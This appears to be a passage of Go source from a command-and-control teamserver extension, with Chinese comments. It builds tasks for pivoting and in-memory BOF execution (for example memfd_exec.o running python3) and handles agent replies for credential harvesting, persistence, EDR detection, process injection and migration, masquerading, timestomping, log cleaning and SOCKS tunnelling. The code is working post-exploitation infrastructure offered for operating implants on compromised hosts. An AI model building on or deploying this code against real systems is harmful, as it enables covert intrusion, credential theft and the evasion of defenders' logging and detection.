		target, err := getStringArg(args, "target")
		if err != nil {
			goto RET
		}
		portF, err := getFloatArg(args, "port")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLink{Address: target, Port: int(portF)})
		cmd = Command{Code: COMMAND_LINK, Data: packerData}

	case "listen":
		// 反向 pivot：本 agent 监听，子 agent 拨入。
		// 子机侧零监听端口，且只需要"出站"可达（正向的父拨子要求子机
		// 入站放行，默认 deny 的主机防火墙通常直接拒绝）。
		// port == 0 表示停止监听。
		portF, err := getFloatArg(args, "port")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsPivotListen{Port: int(portF)})
		cmd = Command{Code: COMMAND_PIVOT_LISTEN, Data: packerData}

	case "unlink":
		pivotName, err := getStringArg(args, "id")
		if err != nil {
			goto RET
		}
		pivotId, _, _ := Ts.TsGetPivotInfoByName(pivotName)
		if pivotId == "" {
			err = fmt.Errorf("pivot %s does not exist", pivotName)
			goto RET
		}
		id, _ := strconv.ParseUint(pivotId, 16, 64)
		packerData, _ := msgpack.Marshal(ParamsUnlink{PivotId: uint32(id)})
		cmd = Command{Code: COMMAND_UNLINK, Data: packerData}

	case "execute":
		if subcommand == "bof" {
			taskData.Type = adaptix.TASK_TYPE_TASK

			bofFile, err := getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			// The Qt client sends the BOF as a base64 blob (file-picker
			// arg); the Web UI console has no picker, so also accept a
			// teamserver-side file path, e.g.:
			//   execute bof /root/cc/bofs/memfd_exec.o [param_data] [-a]
			var bofContent []byte
			if _, statErr := os.Stat(bofFile); statErr == nil {
				bofContent, err = os.ReadFile(bofFile)
			} else {
				bofContent, err = base64.StdEncoding.DecodeString(bofFile)
			}
			if err != nil || len(bofContent) == 0 {
				err = fmt.Errorf("bof: '%s' is neither an existing file nor valid base64 content", bofFile)
				goto RET
			}

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil || len(params) == 0 {
					// Console UX: pack plain-text space-separated tokens
					// into beacon-style length-prefixed fields so BOFs
					// using BeaconDataExtract work without the Qt packer,
					// e.g. `execute bof memfd_exec.o /usr/bin/python3 -c id`
					//
					// The blob MUST begin with a 4-byte LE *count* of the
					// fields that follow: BeaconDataParse() skips exactly
					// those 4 bytes and BeaconDataExtract/Int then walk
					// (4B len + bytes)*.  Omitting the count shifted every
					// field by 4 bytes (ISS-005); matrix_resolver.go:261
					// writes it, this branch did not.
					toks := strings.Fields(paramData)
					params = make([]byte, 4)
					binary.LittleEndian.PutUint32(params, uint32(len(toks)))
					for _, tok := range toks {
						buf := make([]byte, 4, 4+len(tok))
						binary.LittleEndian.PutUint32(buf, uint32(len(tok)))
						buf = append(buf, tok...)
						params = append(params, buf...)
					}
					err = nil // fallback succeeded: clear the base64 error
				}
			}

			packerData, _ := msgpack.Marshal(ParamsBof{
				Content:   bofContent,
				Args:      params,
				EntryFunc: "go",
			})

			asyncFlag := getBoolArg(args, "async")
			if asyncFlag {
				cmd = Command{Code: COMMAND_EXEC_BOF_ASYNC, Data: packerData}
			} else {
				cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
			}
		} else {
			err = errors.New("subcommand 必须为 'bof'")
			goto RET
		}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, _ = msgpack.Marshal(cmd)

RET:
	return taskData, messageData, err
}

// parseMountsToDrives converts /proc/self/mountinfo or /proc/mounts text
// (as returned by the agent's mounts task) into the file-manager disk list.
// Pseudo filesystems are skipped so only real mount points show up.
func parseMountsToDrives(output string) []adaptix.ListingDrivesDataWin {
	var drives []adaptix.ListingDrivesDataWin
	seen := make(map[string]bool)

	add := func(path, fstype string) {
		if path == "" || seen[path] {
			return
		}
		seen[path] = true
		drives = append(drives, adaptix.ListingDrivesDataWin{Name: path, Type: fstype})
	}

	for _, line := range strings.Split(output, "\n") {
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}

		var path, fstype string
		// /proc/self/mountinfo: id parent maj:min root mountpoint opts... - fstype source
		sep := -1
		for i, f := range fields {
			if f == "-" {
				sep = i
				break
			}
		}
		if sep >= 5 && sep+2 <= len(fields) {
			path = fields[4]
			fstype = fields[sep+1]
		} else {
			// /proc/mounts: device mountpoint fstype options...
			path = fields[1]
			fstype = fields[2]
		}

		if path == "" || isPseudoFs(fstype) {
			continue
		}
		add(path, fstype)
	}

	if !seen["/"] {
		drives = append([]adaptix.ListingDrivesDataWin{{Name: "/", Type: "rootfs"}}, drives...)
	}
	return drives
}

func isPseudoFs(fstype string) bool {
	switch fstype {
	case "proc", "sysfs", "cgroup", "cgroup2", "devtmpfs", "devpts",
		"tmpfs", "overlay", "mqueue", "securityfs", "pstore", "bpf",
		"debugfs", "tracefs", "fusectl", "configfs", "hugetlbfs",
		"rpc_pipefs", "autofs", "binfmt_misc", "efivarfs", "ramfs",
		"nsfs", "cpuset", "fuse.gvfsd-fuse", "fuse.portal":
		return true
	}
	return false
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := msgpack.Unmarshal(decryptedData, &inMessage)
	if err != nil {
		return errors.New("failed to unmarshal message")
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = msgpack.Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' 文件内容：", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "当前工作目录："
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "已复制"

			case COMMAND_PWD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "当前工作目录："
				task.ClearText = params.Path

			case COMMAND_KILL:
				task.Message = "进程已结束"

			case COMMAND_GETUID:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "用户信息："
				task.ClearText = params.Output

			case COMMAND_ENV:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "环境变量："
				task.ClearText = params.Output

			case COMMAND_NETSTAT:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "网络连接："
				task.ClearText = params.Output

			case COMMAND_MOUNTS:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "挂载点："
				task.ClearText = params.Output

				// File manager: present mount points as the "disks" list.
				// TsClientGuiDisksWindows silently ignores non-browser
				// tasks, so plain console `mounts` output is unaffected.
				drives := parseMountsToDrives(params.Output)
				Ts.TsClientGuiDisksWindows(task, drives)

			case COMMAND_EDR:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "安全工具检测："
				task.ClearText = params.Output

			case COMMAND_CREDS:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "凭据收集："
				task.ClearText = params.Output

			case COMMAND_PERSIST:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "持久化："
				task.ClearText = params.Output

			case COMMAND_CONTAINER:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "容器/云环境信息："
				task.ClearText = params.Output

			case COMMAND_MASQUERADE:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "进程伪装："
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_TIMESTOMP:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "时间戳修改："
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_CLEANLOG:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "日志清理："
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_INJECT:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "进程注入："
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_MIGRATE:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "进程迁移："
				task.ClearText = ans.Output

			case COMMAND_LINK:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "连接失败："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsLink
				if err := msgpack.Unmarshal(cmd.Data, &params); err != nil {
					continue
				}
				// params.Beat contains the child agent's encrypted init data
				// params.Watermark is the child's watermark identifier
				watermark := fmt.Sprintf("%08x", params.Watermark)
				childAgentId, linkErr := Ts.TsListenerInteralHandler(watermark, params.Beat)
				if linkErr != nil || childAgentId == "" {
					task.Message = fmt.Sprintf("连接失败：listener handler 处理 watermark %s 出错", watermark)
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				// 反向 pivot 没有发起任务（子机是在 COMMAND_PIVOT_LISTEN 返回很久之后才
				// 拨进来的），所以 id 从载荷里取。两侧必须遵守同一条规则：
				// agent 侧把子机 watermark 存为 pivot id。
				pivotId := task.TaskId
				if TaskId == 0 {
					pivotId = watermark
				}
				_ = Ts.TsPivotCreate(pivotId, agentData.Id, childAgentId, "", false)

				task.Message = fmt.Sprintf("----- 新的 TCP 中转 agent：[%s]===[%s] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)

			case COMMAND_UNLINK:
				var params AnsUnlink
				if err := msgpack.Unmarshal(cmd.Data, &params); err != nil {
					continue
				}

				pivotId := fmt.Sprintf("%08x", params.PivotId)
				pivotType := params.Type

				_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)

				messageParent := ""
				messageChild := ""
				if pivotType == 2 {
					messageParent = fmt.Sprintf("TCP agent %s 连接已重置", childAgentId)
					messageChild = " ----- TCP agent 连接已重置 ----- "
				} else if pivotType == 10 {
					messageParent = fmt.Sprintf("Pivot agent %s 连接已重置", childAgentId)
					messageChild = " ----- Pivot agent 连接已重置 ----- "
				}

				if pivotType != 0 {
					_ = Ts.TsPivotDelete(pivotId)
					if TaskId == 0 {
						// Auto-disconnect from process_pivots — no task to update
						Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
						Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
						continue
					} else {
						task.Message = messageParent
					}
					Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
				}

			case COMMAND_PIVOT_EXEC:
				var params AnsPivotExec
				if err := msgpack.Unmarshal(cmd.Data, &params); err != nil {
					continue
				}
				pivotId := fmt.Sprintf("%08x", params.PivotId)
				_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)
				_ = Ts.TsAgentProcessData(childAgentId, params.Data)
				continue // silent relay — no task output

			case COMMAND_EXEC_BOF:
				var bofOut AnsBofOutput
				if err := msgpack.Unmarshal(cmd.Data, &bofOut); err != nil {
					task.Message = "BOF 已完成"
					task.Completed = true
					break
				}
				switch bofOut.Type {
				case BOF_ERROR_PARSE:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 错误"
					task.ClearText = "Parse BOF error: " + bofOut.Output
				case BOF_ERROR_SYMBOL:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 错误"
					task.ClearText = "Symbol not found: " + bofOut.Output
				case BOF_ERROR_ENTRY:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 错误"
					task.ClearText = "Entry function not found"
				case BOF_ERROR_ALLOC:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 错误"
					task.ClearText = "Error allocation of BOF memory"
				case BOF_ERROR_RELOC:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 错误"
					task.ClearText = "Relocation failed: " + bofOut.Output
				case CALLBACK_ERROR:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 输出"
					task.ClearText = bofOut.Output
				default:
					task.MessageType = adaptix.MESSAGE_SUCCESS
					task.Message = "BOF 输出"
					task.ClearText = bofOut.Output
					// Phase 3: matrix resolver auto-chain hook
					maybeMatrixResolve(agentData.Id, agentData.Arch, bofOut.Output)
				}

			case COMMAND_EXEC_BOF_ASYNC:
				task.Message = "异步 BOF 已启动"
				task.Completed = false

			case COMMAND_EXIT:
				task.Message = "agent 已完成其工作（终止进程）"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = msgpack.Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				Output := ""
				if len(jobList) > 0 {
					Output += fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						}

						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "任务列表："
					task.ClearText = Output
				} else {
					task.Message = "无活动任务"
				}

			case COMMAND_JOB_KILL:
				task.Message = "任务已终止"

			case COMMAND_LS:
				var params AnsLs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var items []adaptix.ListingFileDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					var Files []FileInfo
					err := msgpack.Unmarshal(params.Files, &Files)
					if err != nil {
						continue
					}

					filesCount := len(Files)
					if filesCount == 0 {
						task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
					} else {

						modeFsize := 1
						lnkFsize := 1
						userFsize := 1
						groupFsize := 1
						sizeFsize := 1
						dateFsize := 1

						for _, f := range Files {
							val := fmt.Sprintf("%d", f.Nlink)
							if len(val) > lnkFsize {
								lnkFsize = len(val)
							}
							val = fmt.Sprintf("%d", f.Size)
							if len(val) > sizeFsize {
								sizeFsize = len(val)
							}
							if len(f.Mode) > modeFsize {
								modeFsize = len(f.Mode)
							}
							if len(f.User) > userFsize {
								userFsize = len(f.User)
							}
							if len(f.Group) > groupFsize {
								groupFsize = len(f.Group)
							}
							if len(f.Date) > dateFsize {
								dateFsize = len(f.Date)
							}
						}

						format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
						OutputText := ""
						for _, fi := range Files {
							OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

							fileData := adaptix.ListingFileDataUnix{
								IsDir:    fi.IsDir,
								Mode:     fi.Mode,
								User:     fi.User,
								Group:    fi.Group,
								Size:     fi.Size,
								Date:     fi.Date,
								Filename: fi.Filename,
							}

							items = append(items, fileData)
						}

						task.Message = fmt.Sprintf("Listing '%s'", params.Path)
						task.ClearText = OutputText
					}
				}
				Ts.TsClientGuiFilesUnix(task, params.Path, items)

			case COMMAND_MKDIR:
				task.Message = "目录已创建"

			case COMMAND_MV:
				task.Message = "已移动"

			case COMMAND_PS:
				var params AnsPs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var proclist []adaptix.ListingProcessDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					var Processes []PsInfo
					err := msgpack.Unmarshal(params.Processes, &Processes)
					if err != nil {
						continue
					}

					procCount := len(Processes)
					if procCount == 0 {
						task.Message = "获取进程列表失败"
						task.MessageType = adaptix.MESSAGE_ERROR
						break
					} else {
						pidFsize := 3
						ppidFsize := 4
						ttyFsize := 3
						contextFsize := 7
						processFsize := 7

						for _, p := range Processes {
							val := fmt.Sprintf("%d", p.Pid)
							if len(val) > pidFsize {
								pidFsize = len(val)
							}
							val = fmt.Sprintf("%d", p.Ppid)
							if len(val) > ppidFsize {
								ppidFsize = len(val)
							}
							if len(p.Tty) > ttyFsize {
								ttyFsize = len(p.Tty)
							}
							if len(p.Context) > contextFsize {
								contextFsize = len(p.Context)
							}
							if len(p.Process) > processFsize {
								processFsize = len(p.Process)
							}

							procData := adaptix.ListingProcessDataUnix{
								Pid:         uint(p.Pid),
								Ppid:        uint(p.Ppid),
								TTY:         p.Tty,
								Context:     p.Context,
								ProcessName: p.Process,
							}

							proclist = append(proclist, procData)
						}

						format := fmt.Sprintf(" %%-%dv  %%-%dv  %%-%ds  %%-%ds  %%-%ds", pidFsize, ppidFsize, ttyFsize, contextFsize, processFsize)
						OutputText := fmt.Sprintf(format, "PID", "PPID", "TTY", "Context", "Process")
						OutputText += fmt.Sprintf("\n"+format, "---", "----", "---", "-------", "-------")

						for _, p := range Processes {
							OutputText += fmt.Sprintf("\n"+format, p.Pid, p.Ppid, p.Tty, p.Context, p.Process)
						}

						task.Message = "进程列表："
						task.ClearText = OutputText
					}
				}
				Ts.TsClientGuiProcessUnix(task, proclist)

			case COMMAND_RM:
				task.Message = "已删除"

			case COMMAND_SHELL:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Shell 错误："
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Shell 命令输出："
				task.ClearText = params.Output

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("文件已上传：%s", params.Path)

			case COMMAND_ERROR:
				var params AnsError
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "错误："
				task.ClearText = params.Error
				task.MessageType = adaptix.MESSAGE_ERROR

			case COMMAND_DOWNLOAD:
				task.Message = "下载已开始"
				task.Completed = false

			case COMMAND_RUN:
				task.Message = "进程已启动（异步）"
				task.Completed = false

			// Tunnel MUX responses (transparent — no task UI, route directly to Ts*)
			case COMMAND_TUNNEL_STATUS:
				var params AnsTunnelStatus
				if merr := msgpack.Unmarshal(cmd.Data, &params); merr == nil {
					if params.Success {
						Ts.TsTunnelConnectionResume(agentData.Id, params.ChannelId, false)
					} else {
						errorCode := adaptix.SOCKS5_HOST_UNREACHABLE
						if params.Reason == 5 { // connection refused
							errorCode = adaptix.SOCKS5_CONNECTION_REFUSED
						}
						Ts.TsTunnelConnectionHalt(params.ChannelId, errorCode)
					}
				}
				continue

			case COMMAND_TUNNEL_DATA:
				var params AnsTunnelData
				if merr := msgpack.Unmarshal(cmd.Data, &params); merr == nil {
					Ts.TsTunnelConnectionData(params.ChannelId, params.Data)
				}
				continue

			case COMMAND_TUNNEL_CLOSE:
				var params AnsTunnelClose
				if merr := msgpack.Unmarshal(cmd.Data, &params); merr == nil {
					Ts.TsTunnelConnectionClose(params.ChannelId, false)
				}
				continue

			// Agent backpressure responses (transparent)
			case COMMAND_TUNNEL_PAUSE:
				// Agent says: my write buffer is full, stop sending TUNNEL_WRITE
				// The teamserver handles this via TsTunnelConnectionClose with writeOnly
				continue

			case COMMAND_TUNNEL_RESUME:
				// Agent says: write buffer drained, resume TUNNEL_WRITE
				continue

			case COMMAND_TUNNEL_WRITE:
				// This should never come from agent→teamserver, ignore
				continue

			case COMMAND_TUNNEL_START:
				task.Message = "隧道启动中"
				task.Completed = false

			case COMMAND_TUNNEL_STOP:
				task.Message = "隧道已停止"

			case COMMAND_TERMINAL_START:
				task.Message = "终端启动中"
				task.Completed = false

			case COMMAND_TERMINAL_STOP:
				task.Message = "终端已停止"

			default:
				task.Message = "未知响应"
				task.MessageType = adaptix.MESSAGE_ERROR
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		for _, jobBytes := range inMessage.Object {

			err = msgpack.Unmarshal(jobBytes, &job)
			if err != nil {
				continue
			}

			commandId := job.CommandId

			switch commandId {

			case COMMAND_DOWNLOAD:
				var params AnsDownload
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					continue
				}

				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					_ = Ts.TsDownloadAdd(agentData.Id, fileId, params.Path, int64(params.Size))
				}

				_ = Ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					if params.Canceled {
						_ = Ts.TsDownloadClose(fileId, 4)
					} else {
						_ = Ts.TsDownloadClose(fileId, 3)
					}
				}

			case COMMAND_RUN:
				var params AnsRun
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					continue
				}

				task := taskData
				task.TaskId = job.JobId
				task.Completed = params.Finish

				if params.Start {
					task.Completed = false
					task.Message = fmt.Sprintf("进程已启动：PID = %d", params.Pid)
					task.ClearText = "\n"

				} else if params.Finish {
					task.Message = "进程已结束"
					task.ClearText = "\n"

				} else {
					task.Completed = false
					task.Message = ""

					if len(params.Stderr) > 0 {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = "标准错误："
						task.ClearText = params.Stderr
					}
					if len(params.Stdout) > 0 {
						task.ClearText = params.Stdout
					}
				}

				outTasks = append(outTasks, task)

			// NOTE: Tunnel commands no longer come through Type 2 (Job).
			// Tunnel MUX data flows in Type 1 (Command) via process_tunnels().

			case COMMAND_TERMINAL_START, COMMAND_TERMINAL_STOP:
				termTask := adaptix.TaskData{
					Type:    adaptix.TASK_TYPE_PROXY_DATA,
					AgentId: agentData.Id,
					Data:    job.Data,
					Sync:    false,
				}
				outTasks = append(outTasks, termTask)

			case COMMAND_EXEC_BOF_OUT:
				var bofOut AnsBofOutput
				if err := msgpack.Unmarshal(job.Data, &bofOut); err != nil {
					continue
				}

				task := taskData
				task.TaskId = job.JobId

				if bofOut.Type == 0xFF {
					// Sentinel: async BOF finished
					task.Message = "异步 BOF 已结束"
					task.Completed = true
					task.ClearText = "\n"
				} else if bofOut.Type == CALLBACK_ERROR {
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 输出"
					task.ClearText = bofOut.Output
					task.Completed = false
				} else if bofOut.Type >= 0x100 {
					// BOF error codes
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF 错误"
					task.ClearText = bofOut.Output
					task.Completed = true
				} else {
					task.MessageType = adaptix.MESSAGE_SUCCESS
					task.Message = "BOF 输出"
					task.ClearText = bofOut.Output
					task.Completed = false
				}

				outTasks = append(outTasks, task)
			}
		}
	}

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	_ = job

	return nil
}
